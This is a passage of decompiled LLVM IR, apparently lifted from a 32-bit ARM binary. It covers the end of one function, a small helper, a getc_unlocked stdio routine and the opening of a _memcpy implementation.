  br i1 %v9_15a54, label %dec_label_pc_15a64, label %dec_label_pc_15a28

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a3c
  %v1_15a64 = load i32, i32* %r5.global-to-local, align 4
  %v2_15a64 = sub i32 %v1_15a5c, %v1_15a64
  %v3_15a64 = icmp ult i32 %v1_15a5c, %v1_15a64
  %v4_15a64 = xor i32 %v1_15a64, %v1_15a5c
  %v5_15a64 = xor i32 %v2_15a64, %v1_15a5c
  %v6_15a64 = and i32 %v5_15a64, %v4_15a64
  %v7_15a64 = icmp slt i32 %v6_15a64, 0
  store i1 %v7_15a64, i1* %cpsr_v.global-to-local, align 1
  %v8_15a64 = icmp slt i32 %v2_15a64, 0
  store i1 %v8_15a64, i1* %cpsr_n.global-to-local, align 1
  %v9_15a64 = icmp eq i32 %v1_15a5c, %v1_15a64
  store i1 %v9_15a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15a64, label %dec_label_pc_15a3c, label %dec_label_pc_15a6c

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15a64, %dec_label_pc_15a28
  %v0_15a6c = phi i32 [ -1, %dec_label_pc_15a28 ], [ %v2_15a58, %dec_label_pc_15a64 ]
  store i32 %v0_15a6c, i32* %r0.global-to-local, align 4
  %v2_15a74 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15a74, i32* %r4.global-to-local, align 4
  ret i32 %v0_15a6c

; uselistorder directives
  uselistorder i32 %v0_15a6c, { 1, 0 }
  uselistorder i32 %v2_15a64, { 1, 0 }
  uselistorder i32 %v1_15a64, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15a5c, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_15a54, { 1, 0 }
  uselistorder i32 %v3_15a50, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15a4c, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 %v0_15a3c, { 2, 1, 0 }
  uselistorder i32 %v3_15a00, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_159dc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_159a4, { 0, 1, 3, 2 }
  uselistorder i32 %v4_15998, { 1, 2, 0 }
  uselistorder i32 %v0_15998, { 1, 0 }
  uselistorder i32 %v1_159a0.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_15958, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_15954, { 2, 1, 0 }
  uselistorder i32 %storemerge180, { 1, 0 }
  uselistorder i32 %v0_15918, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1590c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_158e8, { 1, 0 }
  uselistorder i32 %v2_158e0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_158d8, { 1, 0 }
  uselistorder i32 %v0_158d0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_158b8, { 1, 0 }
  uselistorder i32 %v1_15894, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15894, { 1, 0, 2 }
  uselistorder i32 %v0_1586c, { 3, 0, 1, 2 }
  uselistorder i1 %v2_1584c, { 2, 1, 0 }
  uselistorder i32 %v2_157d8, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_157c8, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_158f0, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_15834, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_15774, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_15758, { 1, 0 }
  uselistorder i32 %v1_15750, { 1, 2, 0 }
  uselistorder i32 %v2_15744, { 1, 0 }
  uselistorder i32 %v1_15744, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15744, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_1573c, { 1, 0, 2 }
  uselistorder i32 %v0_15734, { 3, 0, 1, 2 }
  uselistorder i1 %v3_15714, { 1, 0 }
  uselistorder i32 %v2_15714, { 1, 0 }
  uselistorder i32 %v2_15710, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_156fc, { 1, 0 }
  uselistorder i32 %v1_15700, { 2, 1, 0 }
  uselistorder i1 %v2_156f0, { 1, 0 }
  uselistorder i32 %v0_156ec, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_156d4, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_156c8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_15680, { 1, 2, 0 }
  uselistorder i32 %v2_1567c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15664, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_1565c, { 1, 0 }
  uselistorder i32 %v0_15668, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_15644, { 1, 0 }
  uselistorder i32 %v0_15630, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_15624, { 0, 2, 1, 3 }
  uselistorder i32 %v0_15618, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_15614, { 0, 1, 3, 2 }
  uselistorder i32 %v0_155cc, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1551c, { 1, 0 }
  uselistorder i32 %v11_154f8, { 1, 2, 0 }
  uselistorder double %v9_154f8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_154a4, { 1, 0 }
  uselistorder i32 %v1_15490, { 3, 2, 0, 1 }
  uselistorder i32 %v0_154f0, { 1, 0 }
  uselistorder i32 %v5_1543c, { 1, 0 }
  uselistorder i32 %v0_15428, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_15348.v1_1535c8, { 1, 0 }
  uselistorder i1 %not.v7_15350, { 1, 0 }
  uselistorder i1 %v7_15350, { 1, 2, 0 }
  uselistorder i32 %v1_15660, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_152bc, { 1, 0 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 5, 6, 7, 4, 8, 2, 9, 10, 3, 11 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 10, 4, 5, 11, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 25, 46, 28, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 57, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 1, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 10, 11, 12, 7, 8, 9, 13, 14, 15, 17, 16, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r0.global-to-local, { 13, 37, 14, 15, 16, 17, 2, 18, 19, 28, 25, 27, 29, 20, 21, 26, 22, 23, 12, 30, 24, 5, 31, 32, 9, 10, 8, 7, 6, 33, 34, 1, 3, 0, 11, 35, 36, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 13, 11, 12, 14, 15, 21, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 18, 19, 20, 21, 22, 23, 24, 25, 55, 26, 27, 28, 29, 30, 54, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 53, 17, 18, 19, 20, 21, 22, 23, 24, 25, 52, 26, 27, 28, 29, 51, 30, 31, 32, 33, 34, 35, 36, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 18, 19, 20, 21, 22, 23, 24, 25, 26, 55, 27, 28, 29, 30, 54, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F000000001E89B) to float) to i32), { 1, 0 }
  uselistorder i32 520, { 1, 0 }
  uselistorder i32 95, { 1, 2, 0 }
  uselistorder double 0.000000e+00, { 1, 3, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 5, 4, 3, 2, 7, 6, 8, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 5, 4, 3, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder double %arg2, { 0, 1, 5, 6, 3, 4, 2, 7 }
  uselistorder label %dec_label_pc_15a34, { 2, 0, 1 }
  uselistorder label %bb270, { 1, 0 }
  uselistorder label %dec_label_pc_15994, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1590c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_158e0, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_158b8, { 1, 0 }
  uselistorder label %dec_label_pc_15894, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15878, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15844, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15840, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1579c, { 1, 0 }
  uselistorder label %bb257, { 1, 0 }
  uselistorder label %dec_label_pc_1578c, { 1, 0 }
  uselistorder label %dec_label_pc_15780, { 1, 0 }
  uselistorder label %bb251, { 1, 0 }
  uselistorder label %bb249, { 1, 0 }
  uselistorder label %bb247, { 1, 0 }
  uselistorder label %.thread162, { 1, 0 }
  uselistorder label %bb243, { 1, 0 }
  uselistorder label %bb241, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb238, { 1, 0 }
  uselistorder label %dec_label_pc_156a0, { 2, 1, 0 }
  uselistorder label %bb235, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_155c8, { 1, 0 }
  uselistorder label %dec_label_pc_15588, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_15418, { 1, 0 }
  uselistorder label %dec_label_pc_15334, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @"$d.13"(i32 %arg1) local_unnamed_addr {
dec_label_pc_15a78:
  %v0_15a8c = load i1, i1* @cpsr_n, align 1
  br i1 %v0_15a8c, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_15a78
  %v0_15a98.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15a98.pr, label %bb11, label %.thread2

bb:                                               ; preds = %dec_label_pc_15a78
  %v1_15a90 = load i32, i32* @r4, align 4
  %v3_15a90 = xor i32 %v1_15a90, %arg1
  %v2_15a94 = sub i32 -1, %v3_15a90
  %v4_15a94 = icmp eq i32 %v3_15a90, -1
  br i1 %v4_15a94, label %bb11, label %.thread2

bb11:                                             ; preds = %bb, %thread-pre-split
  %v7_15a9c9 = phi i32 [ %v2_15a94, %bb ], [ %arg1, %thread-pre-split ]
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb11
  %v7_15a9c = phi i32 [ %v2_15a94, %bb ], [ %arg1, %thread-pre-split ], [ %v7_15a9c9, %bb11 ]
  ret i32 %v7_15a9c

; uselistorder directives
  uselistorder i32 %v2_15a94, { 1, 0 }
  uselistorder i32 %v3_15a90, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_15aa0 = load i32, i32* @r4, align 4
  store i32 %v3_15aa0, i32* %stack_var_-8, align 4
  %v0_15aa4 = load i32, i32* @r0, align 4
  %v1_15aa4 = add i32 %v0_15aa4, 16
  %v2_15aa4 = inttoptr i32 %v1_15aa4 to i32*
  %v3_15aa4 = load i32, i32* %v2_15aa4, align 4
  store i32 %v3_15aa4, i32* %r2.global-to-local, align 4
  %v1_15aa8 = add i32 %v0_15aa4, 24
  %v2_15aa8 = inttoptr i32 %v1_15aa8 to i32*
  %v3_15aa8 = load i32, i32* %v2_15aa8, align 4
  %v3_15aac = icmp ult i32 %v3_15aa4, %v3_15aa8
  store i32 %v0_15aa4, i32* @r4, align 4
  br i1 %v3_15aac, label %bb, label %dec_label_pc_15ac4

bb:                                               ; preds = %entry
  %v2_15ab4 = inttoptr i32 %v3_15aa4 to i8*
  %v3_15ab4 = load i8, i8* %v2_15ab4, align 1
  %v4_15ab4 = zext i8 %v3_15ab4 to i32
  store i32 %v4_15ab4, i32* %r0.global-to-local, align 4
  %v6_15ab4 = add i32 %v3_15aa4, 1
  store i32 %v6_15ab4, i32* %r2.global-to-local, align 4
  store i32 %v6_15ab4, i32* %v2_15aa4, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_15ac4:                               ; preds = %entry
  %v1_15ac4 = inttoptr i32 %v0_15aa4 to i8*
  %v2_15ac4 = load i8, i8* %v1_15ac4, align 1
  %v3_15ac4 = zext i8 %v2_15ac4 to i32
  %v1_15ac8 = and i32 %v3_15ac4, 131
  %tmp22 = icmp ugt i32 %v1_15ac8, 128
  br i1 %tmp22, label %dec_label_pc_15ae4, label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15ac4
  store i32 128, i32* @r1, align 4
  %v0_15ad8 = call i32 @__stdio_trans2r_o()
  store i32 %v0_15ad8, i32* %r0.global-to-local, align 4
  %v2_15adc = icmp eq i32 %v0_15ad8, 0
  br i1 %v2_15adc, label %dec_label_pc_15ad4.dec_label_pc_15ae4_crit_edge, label %dec_label_pc_15bc0

dec_label_pc_15ad4.dec_label_pc_15ae4_crit_edge:  ; preds = %dec_label_pc_15ad4
  %v0_15ae4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15ae4

dec_label_pc_15ae4:                               ; preds = %dec_label_pc_15ad4.dec_label_pc_15ae4_crit_edge, %dec_label_pc_15ac4
  %v2_15b30 = phi i32 [ %v0_15ae4.pre, %dec_label_pc_15ad4.dec_label_pc_15ae4_crit_edge ], [ %v0_15aa4, %dec_label_pc_15ac4 ]
  %v1_15ae4 = inttoptr i32 %v2_15b30 to i8*
  %v2_15ae4 = load i8, i8* %v1_15ae4, align 1
  %v3_15ae4 = zext i8 %v2_15ae4 to i32
  store i32 %v3_15ae4, i32* %r2.global-to-local, align 4
  %v1_15ae8 = add i32 %v2_15b30, 1
  %v2_15ae8 = inttoptr i32 %v1_15ae8 to i8*
  %v3_15ae8 = load i8, i8* %v2_15ae8, align 1
  %v4_15ae8 = zext i8 %v3_15ae8 to i32
  %v4_15aec = mul nuw nsw i32 %v4_15ae8, 256
  %v5_15aec = or i32 %v4_15aec, %v3_15ae4
  store i32 %v5_15aec, i32* %r2.global-to-local, align 4
  %v1_15af0 = and i32 %v3_15ae4, 2
  %v2_15af0 = icmp eq i32 %v1_15af0, 0
  br i1 %v2_15af0, label %dec_label_pc_15b20, label %dec_label_pc_15af8

dec_label_pc_15af8:                               ; preds = %dec_label_pc_15ae4
  %tmp23 = urem i8 %v2_15ae4, 2
  %v1_15af8 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_15af8
  %v4_15afc = and i32 %tmp18, 4
  %v5_15afc = add i32 %v4_15afc, %v2_15b30
  %v1_15b00 = add i32 %v5_15afc, 36
  %v2_15b00 = inttoptr i32 %v1_15b00 to i8*
  %v3_15b00 = load i8, i8* %v2_15b00, align 1
  %v4_15b00 = zext i8 %v3_15b00 to i32
  %v1_15b04 = add nsw i32 %v5_15aec, -1
  store i32 %v1_15b04, i32* %r2.global-to-local, align 4
  %v3_15b08 = sdiv i32 %v1_15b04, 256
  store i32 %v3_15b08, i32* %r1.global-to-local, align 4
  store i32 %v4_15b00, i32* %r0.global-to-local, align 4
  %v2_15b14 = add i32 %v2_15b30, 40
  %v3_15b14 = inttoptr i32 %v2_15b14 to i32*
  store i32 0, i32* %v3_15b14, align 4
  %v0_15b18 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b18 = trunc i32 %v0_15b18 to i8
  %v2_15b18 = load i32, i32* @r4, align 4
  %v3_15b18 = add i32 %v2_15b18, 1
  %v4_15b18 = inttoptr i32 %v3_15b18 to i8*
  store i8 %v1_15b18, i8* %v4_15b18, align 1
  br label %dec_label_pc_15b54

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15ae4
  %v1_15b20 = add i32 %v2_15b30, 16
  store i32 %v1_15b20, i32* %r1.global-to-local, align 4
  %v1_15b24 = inttoptr i32 %v1_15b20 to i32*
  %v2_15b24 = load i32, i32* %v1_15b24, align 4
  store i32 %v2_15b24, i32* %r1.global-to-local, align 4
  %v3_15b24 = add i32 %v2_15b30, 20
  %v4_15b24 = inttoptr i32 %v3_15b24 to i32*
  %v5_15b24 = load i32, i32* %v4_15b24, align 4
  %v9_15b28 = icmp eq i32 %v5_15b24, %v2_15b24
  br i1 %v9_15b28, label %dec_label_pc_15b38, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15b20
  %v2_15b2c = inttoptr i32 %v2_15b24 to i8*
  %v3_15b2c = load i8, i8* %v2_15b2c, align 1
  %v4_15b2c = zext i8 %v3_15b2c to i32
  store i32 %v4_15b2c, i32* %r0.global-to-local, align 4
  %v6_15b2c = add i32 %v2_15b24, 1
  store i32 %v6_15b2c, i32* %r1.global-to-local, align 4
  store i32 %v6_15b2c, i32* %v1_15b24, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b20
  %v1_15b38 = add i32 %v2_15b30, 4
  %v2_15b38 = inttoptr i32 %v1_15b38 to i32*
  %v3_15b38 = load i32, i32* %v2_15b38, align 4
  %v4_15b40 = icmp eq i32 %v3_15b38, -2
  br i1 %v4_15b40, label %dec_label_pc_15b44, label %dec_label_pc_15b5c

dec_label_pc_15b44:                               ; preds = %dec_label_pc_15b38
  %v1_15b44 = or i32 %v5_15aec, 4
  store i32 %v1_15b44, i32* %r2.global-to-local, align 4
  store i8 %v3_15ae8, i8* %v2_15ae8, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15b54

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15af8, %dec_label_pc_15b44
  %v0_15b54 = load i32, i32* %r2.global-to-local, align 4
  %v1_15b54 = trunc i32 %v0_15b54 to i8
  %v2_15b54 = load i32, i32* @r4, align 4
  %v3_15b54 = inttoptr i32 %v2_15b54 to i8*
  store i8 %v1_15b54, i8* %v3_15b54, align 1
  br label %dec_label_pc_15bc4

dec_label_pc_15b5c:                               ; preds = %dec_label_pc_15b38
  %v1_15b5c = and i32 %v4_15aec, 768
  %v2_15b5c = icmp eq i32 %v1_15b5c, 0
  br i1 %v2_15b5c, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_15b5c
  store i32 ptrtoint (i32** @global_var_2b57c.384 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15b5c, %bb19
  store i32 88936, i32* @lr, align 4
  %v1_15b64 = xor i1 %v2_15b5c, true
  call void @__pseudo_cond_branch(i1 %v1_15b64, i32 ptrtoint (i32* @global_var_1228c.853 to i32))
  %v0_15b68 = load i32, i32* @r4, align 4
  %v1_15b68 = add i32 %v0_15b68, 8
  store i32 %v1_15b68, i32* %r2.global-to-local, align 4
  %v1_15b6c = inttoptr i32 %v1_15b68 to i32*
  %v2_15b6c = load i32, i32* %v1_15b6c, align 4
  store i32 %v2_15b6c, i32* %r2.global-to-local, align 4
  %v3_15b6c = add i32 %v0_15b68, 12
  %v4_15b6c = inttoptr i32 %v3_15b6c to i32*
  %v5_15b6c = load i32, i32* %v4_15b6c, align 4
  %v9_15b70 = icmp eq i32 %v5_15b6c, %v2_15b6c
  br i1 %v9_15b70, label %dec_label_pc_15ba4, label %dec_label_pc_15b78

dec_label_pc_15b78:                               ; preds = %bb20
  %v2_15b78 = add i32 %v0_15b68, 24
  %v3_15b78 = inttoptr i32 %v2_15b78 to i32*
  store i32 %v2_15b6c, i32* %v3_15b78, align 4
  %v0_15b7c = load i32, i32* @r4, align 4
  store i32 %v0_15b7c, i32* %r0.global-to-local, align 4
  %v2_15b80 = call i32 @__stdio_rfill(i32 %v0_15b7c)
  store i32 %v2_15b80, i32* %r0.global-to-local, align 4
  %v2_15b84 = icmp eq i32 %v2_15b80, 0
  br i1 %v2_15b84, label %dec_label_pc_15bc0, label %dec_label_pc_15b8c

dec_label_pc_15b8c:                               ; preds = %dec_label_pc_15b78
  %v0_15b8c = load i32, i32* @r4, align 4
  %v1_15b8c = add i32 %v0_15b8c, 20
  %v2_15b8c = inttoptr i32 %v1_15b8c to i32*
  %v3_15b8c = load i32, i32* %v2_15b8c, align 4
  %v2_15b90 = add i32 %v0_15b8c, 24
  %v3_15b90 = inttoptr i32 %v2_15b90 to i32*
  store i32 %v3_15b8c, i32* %v3_15b90, align 4
  %v0_15b94 = load i32, i32* @r4, align 4
  %v1_15b94 = add i32 %v0_15b94, 16
  %v2_15b94 = inttoptr i32 %v1_15b94 to i32*
  %v3_15b94 = load i32, i32* %v2_15b94, align 4
  %v1_15b98 = inttoptr i32 %v3_15b94 to i8*
  %v2_15b98 = load i8, i8* %v1_15b98, align 1
  %v3_15b98 = zext i8 %v2_15b98 to i32
  store i32 %v3_15b98, i32* %r0.global-to-local, align 4
  %v5_15b98 = add i32 %v3_15b94, 1
  store i32 %v5_15b98, i32* %v2_15b94, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_15ba4:                               ; preds = %bb20
  %v1_15ba4 = inttoptr i32 %v0_15b68 to i8*
  store i32 %v0_15b68, i32* %r0.global-to-local, align 4
  %v2_15ba8 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_15ba8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_15bb0 = call i32 @__stdio_READ(i8* %v1_15ba4, i32 %v2_15ba8, i32 1)
  store i32 %v5_15bb0, i32* %r0.global-to-local, align 4
  %v2_15bb4 = icmp eq i32 %v5_15bb0, 0
  br i1 %v2_15bb4, label %dec_label_pc_15bc0, label %bb21

bb21:                                             ; preds = %dec_label_pc_15ba4
  %v4_15bb8 = load i8, i8* %stack_var_-9, align 1
  %v5_15bb8 = sext i8 %v4_15bb8 to i32
  store i32 %v5_15bb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_15bc0:                               ; preds = %dec_label_pc_15ba4, %dec_label_pc_15ad4, %dec_label_pc_15b78
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_15bc4:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_15b8c, %dec_label_pc_15b54, %dec_label_pc_15bc0
  %v2_15bc8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15bc8, i32* @r4, align 4
  %v8_15bc8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_15bc8

; uselistorder directives
  uselistorder i32 %v2_15b24, { 1, 0, 2, 3 }
  uselistorder i32 %v3_15ae4, { 1, 0, 2 }
  uselistorder i32 %v2_15b30, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_15aa4, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_2b5b4.383, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15bc4, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_15bc0, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_15b54, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_15bd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15bd0 = load i32, i32* %r0.global-to-local, align 4
  %v2_15bd0 = sub i32 %v0_15bd0, %v1_15bd0
  %v3_15bd0 = icmp ult i32 %v0_15bd0, %v1_15bd0
  %v4_15bd0 = xor i32 %v1_15bd0, %v0_15bd0
  %v5_15bd0 = xor i32 %v2_15bd0, %v0_15bd0
  %v6_15bd0 = and i32 %v5_15bd0, %v4_15bd0
  %v7_15bd0 = icmp slt i32 %v6_15bd0, 0
  store i1 %v7_15bd0, i1* %cpsr_v.global-to-local, align 1
  %v8_15bd0 = icmp slt i32 %v2_15bd0, 0
  store i1 %v8_15bd0, i1* %cpsr_n.global-to-local, align 1
  %v9_15bd0 = icmp eq i32 %v0_15bd0, %v1_15bd0
  store i1 %v9_15bd0, i1* @cpsr_z, align 1
  br i1 %v3_15bd0, label %dec_label_pc_15e1c, label %dec_label_pc_15bd8

dec_label_pc_15bd8:                               ; preds = %entry
  br i1 %v9_15bd0, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_15bd8
  %merge = phi i32 [ %v0_15bd0, %dec_label_pc_15bd8 ], [ %v2_15eb0, %bb143 ], [ %v11_15ecc, %bb146 ], [ %v7_15ecc, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_15bd8
  %v5_15bdc = inttoptr i32 %v1_15bd0 to i8*
  store i8* %v5_15bdc, i8** %stack_var_-8, align 4
  %v0_15be0 = load i32, i32* @r2, align 4
  %v2_15be0 = add i32 %v0_15be0, -4
  store i32 %v2_15be0, i32* %r2.global-to-local, align 4
  %v4_15be0 = sub i32 3, %v0_15be0
  %v5_15be0 = and i32 %v4_15be0, %v0_15be0
  %v6_15be0 = icmp slt i32 %v5_15be0, 0
  store i1 %v6_15be0, i1* %cpsr_v.global-to-local, align 1
  %v7_15be0 = icmp slt i32 %v2_15be0, 0
  store i1 %v7_15be0, i1* %cpsr_n.global-to-local, align 1
  %v5_15be4 = icmp slt i32 %v0_15be0, 4
  br i1 %v5_15be4, label %bb133, label %dec_label_pc_15be8

dec_label_pc_15be8:                               ; preds = %bb
  %v1_15be8 = urem i32 %v1_15bd0, 4
  store i32 %v1_15be8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15be8 = icmp eq i32 %v1_15be8, 0
  br i1 %v2_15be8, label %dec_label_pc_15bf0, label %dec_label_pc_15c94

dec_label_pc_15bf0:                               ; preds = %dec_label_pc_15be8
